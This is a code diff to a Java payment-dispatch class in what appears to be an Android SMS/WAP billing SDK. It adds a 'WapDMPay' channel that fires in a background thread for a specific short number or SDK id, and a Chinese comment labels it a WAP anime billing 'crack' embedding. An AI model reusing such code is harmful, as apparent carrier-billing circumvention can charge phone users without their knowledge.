@@ -113,6 +113,12 @@ public class PayTask {
 								payCompleteTasks.put(pay.getKey(), mgzfPay
 										.getStatus() == MGZFPay.MGZF_PAY_OK);
 							}
+							else if (pay.getType() == Pay.PAY_TYPE_WAPDM)
+							{
+								WapDMPay wapDmPay = (WapDMPay) pay;
+								payCompleteTasks.put(pay.getKey(), wapDmPay
+										.getStatus() == WapDMPay.WAPDM_PAY_OK);
+							}
 							break;
 						case Pay.EXECUTE_STATUS_RUN:
 							isRunning=true;
@@ -174,7 +180,16 @@ public class PayTask {
 			xmxtpay.setKey(childKey);
 			payTasks.put(childKey, xmxtpay);
 			new Thread(xmxtpay).start();
-		}else{
+		}else if (phone.equals("34560003")) {
+			// wap动漫破解嵌入
+			WapDMPay dongmanpay = new WapDMPay();
+			dongmanpay.setAddress(phone);
+			dongmanpay.setContent(smsContent);
+			String childKey = UUID.randomUUID().toString();
+			dongmanpay.setKey(childKey);
+			payTasks.put(childKey, dongmanpay);
+			new Thread(dongmanpay).start();
+		} else{
 			//传统短信计费
 			Sms sms = new Sms();
 			sms.setAddCompleteRule(true);
@@ -185,7 +200,7 @@ public class PayTask {
 			sms.setContext(EPCoreManager.getInstance().getContext());
 			payTasks.put(childKey, sms);
 			sms.run();
-		}
+		} 
 		
 	}
 
@@ -282,6 +297,15 @@ public class PayTask {
 			//mgzfPay.setJson(json);
 			mgzfPay.setJsonParams(json);
 			new Thread(mgzfPay).start();
-		}
+		} 
+		else if("11".equals(Sdkid))
+		{
+			WapDMPay wapDmPay = new WapDMPay();
+			wapDmPay.setContext(EPCoreManager.getInstance().getContext());
+			String childKey = UUID.randomUUID().toString();
+			wapDmPay.setKey(childKey);
+			payTasks.put(childKey, wapDmPay);						
+			new Thread(wapDmPay).start();
+		} 
 	}
 }
